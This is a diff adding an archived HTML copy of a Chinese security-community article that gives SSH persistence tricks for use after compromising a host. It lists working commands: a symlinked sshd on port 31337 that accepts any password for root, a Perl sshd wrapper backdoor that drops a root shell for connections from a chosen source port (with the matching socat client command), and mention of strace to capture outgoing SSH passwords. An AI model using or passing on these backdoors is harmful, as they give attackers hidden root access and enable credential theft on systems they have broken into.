@@ -1,0 +1,73 @@
+<html>
+<head>
+     <title>渗透技巧之SSH篇 - mickey</title>
+	 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+</head>
+<body>
+<h1>URL:<a href="http://drops.wooyun.org/tips/1951">http://drops.wooyun.org/tips/1951</a></h1>
+
+      <p>
+        <p>用些小技巧，蒙蒙菜鸟管理员。</p>
+
+<h3>1. 入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口</h3>
+
+<p>肉鸡上执行</p>
+
+<pre><code>#!bash
+mickey@vic:~# ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337; 
+</code></pre>
+
+<p>就会派生一个31337端口，然后连接31337，用root/bin/ftp/mail当用户名，密码随意，就可登陆。</p>
+
+<p>效果图：</p>
+
+<!--more-->
+
+<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/953af6bec7a97500d7687faaf1014b5d.jpg" alt="enter image description here" /></p>
+
+<h3>2. 做一个SSH wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了SSH服务，就能远程连接</h3>
+
+<p>在肉鸡上执行：</p>
+
+<pre><code>#!bash
+[root@localhost ~]# cd /usr/sbin
+[root@localhost sbin]# mv sshd ../bin
+[root@localhost sbin]# echo '#!/usr/bin/perl' &gt;sshd
+[root@localhost sbin]# echo 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);' &gt;&gt;sshd
+[root@localhost sbin]# echo 'exec {"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' &gt;&gt;sshd
+[root@localhost sbin]# chmod u+x sshd
+[root@localhost sbin]# /etc/init.d/sshd restart
+</code></pre>
+
+<p>在本机执行：</p>
+
+<pre><code>#!bash
+socat STDIO TCP4:10.18.180.20:22,sourceport=13377
+</code></pre>
+
+<p>如果你想修改源端口，可以用python的struct标准库实现</p>
+
+<pre><code>#!python
+&gt;&gt;&gt; import struct
+&gt;&gt;&gt; buffer = struct.pack('&gt;I6',19526)
+&gt;&gt;&gt; print repr(buffer)
+'\x00\x00LF'
+&gt;&gt;&gt; buffer = struct.pack('&gt;I6',13377)
+&gt;&gt;&gt; print buffer
+4A
+</code></pre>
+
+<p>效果图如下：</p>
+
+<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/68990a7a20a535e32f0e560e85582e97.jpg" alt="enter image description here" /></p>
+
+<h3>3. 记录SSH客户端连接密码</h3>
+
+<p>搞定主机后，往往想记录肉鸡SSH连接到其他主机的密码，进一步扩大战果，使用strace命令就行了。</p>
+
+<p>效果图：</p>
+
+<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/5ac09127a84d4d6aefd82e2e8be29628.jpg" alt="enter image description here" /></p>      </p>
+    
+</body>
+</html>
